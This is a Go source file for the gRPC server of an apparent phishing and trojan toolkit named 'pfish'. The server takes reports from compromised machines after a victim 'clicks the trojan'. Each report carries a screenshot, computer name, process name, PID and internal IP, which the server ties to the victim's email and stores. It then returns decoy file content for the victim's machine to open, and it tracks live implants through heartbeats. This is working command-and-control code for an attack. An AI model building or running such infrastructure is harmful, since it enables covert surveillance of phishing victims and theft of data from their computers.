package server

import (
	"context"
	"fmt"
	"github.com/pow1e/pfish/api"
	"github.com/pow1e/pfish/config"
	"github.com/pow1e/pfish/pkg/database"
	"github.com/pow1e/pfish/pkg/file"
	"github.com/pow1e/pfish/pkg/model"
	"github.com/pow1e/pfish/pkg/model/common"
	"github.com/sirupsen/logrus"
	"google.golang.org/grpc"
	"net"
	"time"
)

var (
	server *GrpcServer
)

// GrpcServer 定义 gRPC 服务
type GrpcServer struct {
	api.UnimplementedFishServer
	AliveUsers *common.AliveUsers
}

func newServer() *GrpcServer {
	return &GrpcServer{
		AliveUsers: common.NewAliveUsers(),
	}
}

// RunGrpcServer 启动 gRPC 服务
func RunGrpcServer() {
	server = newServer()
	go server.startProbing() // 开启探活

	// 设置监听地址
	lis, err := net.Listen("tcp", fmt.Sprintf(":%s", config.Conf.Server.GRPC.Port))
	if err != nil {
		logrus.Fatalf("Failed to listen: %v", err)
	}

	// 创建 gRPC 服务器
	s := grpc.NewServer()
	api.RegisterFishServer(s, server)
	logrus.Info("启动grpc服务成功，此服务用于截图使用")

	// 启动服务器
	if err = s.Serve(lis); err != nil {
		logrus.Fatalf("Failed to serve: %v", err)
	}
}

func (*GrpcServer) SendMessage(_ context.Context, req *api.SendMessageRequest) (resp *api.SendMessageReply, err error) {
	// 从用户列表查询当前md5对应的email
	user, err := database.FindUserByEmailMD5(req.Md5)
	if err != nil {
		return nil, err
	}

	if user == nil {
		return nil, fmt.Errorf("查询当前md5(%s)失败", req.Md5)
	}

	// 写入文件
	clickTime := time.Now()
	imgPath, err := file.WriteImageFile(config.Conf.Server, user.Email, clickTime, req.GetImgData())
	if err != nil {
		return nil, err
	}

	// 写入 message 到数据库中
	msg := model.Message{
		Uid:         user.ID,
		Computer:    req.GetComputer(),
		Picture:     imgPath,
		ClickTime:   clickTime,
		ProcessName: req.GetProcessName(),
		PID:         req.GetPid(),
		Internal:    req.GetInternal(),
	}
	if err = database.DB.Create(&msg).Error; err != nil {
		return nil, err
	}

	logrus.Infof("[+] 当前邮箱%s点击木马，点击时间:%s，图片路径:%s,图片高度:%d,图片宽度:%d,用户名:%s",
		user.Email, msg.ClickTime, msg.Picture, req.GetHeight(), req.GetWidth(), req.GetComputer(),
	)

	// todo 默认使用agent_config表的第一个为返回内容，后面会添加任务列表，用taskid区分不同的返回值

	var respFile []*model.AgentConfig
	if err = database.DB.Find(&respFile).Error; err != nil {
		return nil, err
	}

	return &api.SendMessageReply{
		Code: 200,
		SendMessageReplyData: &api.SendMessageReplyData{
			OpenFileName: respFile[0].OpenFileName,
			Content:      respFile[0].Content,
		},
	}, nil
}

func (s *GrpcServer) Heartbeat(stream api.Fish_HeartbeatServer) error {
	req, err := stream.Recv()
	if err != nil {
		logrus.Printf("接收客户端请求失败: %v", err)
		return err
	}

	clientID := req.GetClientId()
	common.GlobalAliveUsers.AddClient(clientID, stream)

	for {
		_, err := stream.Recv()
		if err != nil {
			logrus.Printf("客户端断开连接: client_id=%s, 错误=%v", clientID, err)
			common.GlobalAliveUsers.RemoveClient(clientID)
			return err
		}
	}
}

func (s *GrpcServer) startProbing() {
	for {
		time.Sleep(5 * time.Second) // 每隔 5 秒探活
		common.GlobalAliveUsers.ProbeClients()
	}
}
